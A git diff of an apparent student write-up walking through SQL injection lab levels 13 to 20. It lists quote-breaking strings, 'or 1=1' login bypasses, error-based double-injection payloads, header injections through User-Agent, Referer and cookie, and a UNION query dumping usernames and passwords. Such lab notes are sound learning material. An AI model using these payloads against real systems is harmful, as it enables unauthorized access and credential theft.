@@ -103,15 +103,15 @@
 **Query:** *') union (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                             
                                        
 **Level-14**                
-![Screenshot_2024-04-02_08-48-05](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/35cf5a35-e385-44f6-a0ba-d071a62f4858)                          
-- In this level the query can be broken by using combination of a singlequote and a doublequote. Then we can fix the error by commenting out rrst of the thing.                       
+![Screenshot_2024-04-02_08-48-05](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/35cf5a35-e385-44f6-a0ba-d071a62f4858)                           
+- In this level the query can be broken by using combination of a singlequote and a doublequote. Then we can fix the error by commenting out rrst of the thing.                            
 ![Screenshot_2024-04-02_08-49-31](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/360915bc-af1e-4a72-bbbd-1e90f062db33)                                          
 **Error: '"     username'"     '"**                    
 **Fixing: username'" or 1=1 #**                         
 **Query** *union (select 1,1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                     
                                       
-**Less-15**                 
-![Screenshot_2024-04-02_18-24-38](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/3ab6d917-e53d-44a7-a08c-b61ec744b899)                       
+**Less-15**                  
+![Screenshot_2024-04-02_18-24-38](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/3ab6d917-e53d-44a7-a08c-b61ec744b899)                        
 - In this level the query is breaken by single quote, but it doesnt display any error. after fixing the query using boolean conditions if it works we can confirm that it is the error. To confirm i have used or 1=1 which is always true. so if it works with the broken query then it is fixed.                      
 - Later we can use other queries to get information from the database.                                                         
 ![Screenshot_2024-04-02_18-24-01](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/4045798d-4088-45df-b252-e66a280481c3)                                        
@@ -119,24 +119,55 @@
 **Error:  '  username'    '**                   
 **Fixing: username' or 1=1# => which will make us to login**                                    
 **Query:** *' or (select database())='security' #*                        
-                          
-**Less-16**                              
-![Screenshot_2024-04-02_18-33-17](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/af241227-2efe-42e8-b905-5342a8c9b0d5)                          
-- In this level the query part is same as Less-15 but the only difference is the breaking anf fixing of error. Here error can be fixed by using a double quote and parenthes.
-- We can also send time based queries for this level                        
-![Screenshot_2024-04-02_18-34-14](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/6fd843a7-5dbe-4546-b5f7-aa05b27eae80)
-**Error: ("     username")       ")**                                   
-**Fixing: username") or 1=1#**
-**Query:** *' or (select database())='security' #*                              
-**Less-17**
-![Screenshot_2024-04-02_19-53-14](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/568d1efa-b6e9-424d-8a37-359873065831)
-- In this it is a password updation page. it doesnot interact with us it only displays a message if the password updation is sucessful. It also displays an error if we enter username and try password singlequotes.
-- after breaking we can fix the query and we can use double injection to display our messages in that error message.     
-- the backend query is like **UPDATE USERS SET PASSWORD='password' WHERE USERNAME='username'**  
+                           
+**Less-16**                                    
+![Screenshot_2024-04-02_18-33-17](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/af241227-2efe-42e8-b905-5342a8c9b0d5)                                  
+- In this level the query part is same as Less-15 but the only difference is the breaking anf fixing of error. Here error can be fixed by using a double quote and parenthes.                 
+- We can also send time based queries for this level                                   
+![Screenshot_2024-04-02_18-34-14](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/6fd843a7-5dbe-4546-b5f7-aa05b27eae80)                             
+**Error: ("     username")       ")**                                    
+**Fixing: username") or 1=1#**                         
+**Query:** *' or (select database())='security' #*                                
+**Less-17**                              
+![Screenshot_2024-04-02_19-53-14](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/568d1efa-b6e9-424d-8a37-359873065831)                         
+- In this it is a password updation page. it doesnot interact with us it only displays a message if the password updation is sucessful. It also displays an error if we enter username and try password singlequotes.                        
+- after breaking we can fix the query and we can use double injection to display our messages in that error message.              
+- the backend query is like **UPDATE USERS SET PASSWORD='password' WHERE USERNAME='username'**                      
 - After breaking and fixing it will become **UPDATE USERS SET PASSWORD='password' or 1=1 # ' WHERE USERNAME='username'**                        
-![Screenshot_2024-04-02_19-56-37](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/cf3530b9-7544-4307-8e88-5c0906728bd7)                                     
-![Screenshot_2024-04-02_19-57-04](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/922aab84-d732-40ff-97e7-7cae953c511d)                                        
-**Error: '    password'    '**                               
-**Fixing: password' or 1=1**                        
-**Query** *' AND (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                         
-**Less-18**
+![Screenshot_2024-04-02_19-56-37](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/cf3530b9-7544-4307-8e88-5c0906728bd7)                                      
+![Screenshot_2024-04-02_19-57-04](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/922aab84-d732-40ff-97e7-7cae953c511d)                                         
+**Error: '    password'    '**                                
+**Fixing: password' or 1=1**                           
+**Query** *' AND (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                                     
+**Less-18**                              
+![Screenshot_2024-04-02_21-33-20](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/520fe32f-b5a2-4c80-8647-f62eeb73b817)                           
+- In this level the form data is filtered. So we cannot inject the queries in the formdata. But once we login with a username and password we can observe it is showing the **User-Agent**. So by seeing this we can conclude that we can break the query. we can  try breaking the useragent query usingthe burp suite.                           
+![Screenshot_2024-04-02_21-40-29](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/dd2758d0-bdc4-4d17-b08f-c015711d0236)                               
+- We can observe that by placing a single quote it is displaying an error. So we can fix the error and we can make it use to send sql queries.                             
+![Screenshot_2024-04-02_21-41-29](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/5041e198-c774-4f8c-9ffa-1ee53c4aeae8)                            
+- Since it is displaying the errors we can use double injections to find errors.                                
+![Screenshot_2024-04-02_21-31-55](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/0f062521-ca40-4d95-8be5-bafc4fcc70ca)                               
+**Error: ('     uagent'    ')**                        
+**Fixing: uagent',1,1) #**                             
+**Query:** *',(select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b),1)#*                      
+**Less-19**                               
+![Screenshot_2024-04-02_21-53-30](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/b331db6e-55ae-48e3-b8ff-8e7064efea49)                                                  
+- In this level the form data is filtered. so we cannot inject the queries in formdata. But once we login with a username and password we can observe it is showing the **Referer**. So by seeing this we can conclude that we can break the query. we can  try breaking the Referer query usingthe burp suite.                            
+![Screenshot_2024-04-02_21-57-21](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/0327351a-3f78-4b89-b5be-f0e7eb4b03f0)                                                            
+- We can observe that by placing a single quote it is displaying an error. So we can fix the error and we can make it use to send sql queries.                
+![Screenshot_2024-04-02_21-59-07](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/a5ed359e-3f88-47c2-9958-20f4bc0e4e6d)                                            
+- Now after fixing it is not showing any error. Now we can use double injection go get data from the database.                  
+![Screenshot_2024-04-02_22-02-31](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/8784e27c-af40-44ad-9334-0f5428cd8f87)                           
+                                                                                          
+**Less-20**                                      
+![Screenshot_2024-04-02_22-04-57](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/b7049a19-1c64-4079-9285-0ed97c7581f9)                                          
+- In this level the form data is filtered. so we cannot inject the queries in formdata. But once we login with a username and password we can observe it is showing the **cookie*. So by seeing this we can conclude that we can break the query. we can  try breaking the cookie query usingthe burp suite.                                      
+![Screenshot_2024-04-02_22-09-58](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/05d5d27e-f8db-4726-b245-8a4cd655e16c)                                          
+- We can observe by placing a singlw quote the query is breaked and then after by fixing the broken query we can write our queries to fetch data from the database.               
+![Screenshot_2024-04-02_22-13-18](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/135e9956-b70f-4d87-8e3b-2e7547062bd6)                                              
+**Error: ' cookie' '**                           
+**Fixing: cookie',ip)#**                     
+**Query:** *uname=admin' UNION (SELECT 1,group_concat(username),group_concat(password) from users) limit 1,1#*                        
+                                    
+                  
+    -----------------------------------------------------------------**THE END**-----------------------------------------------------------------                   
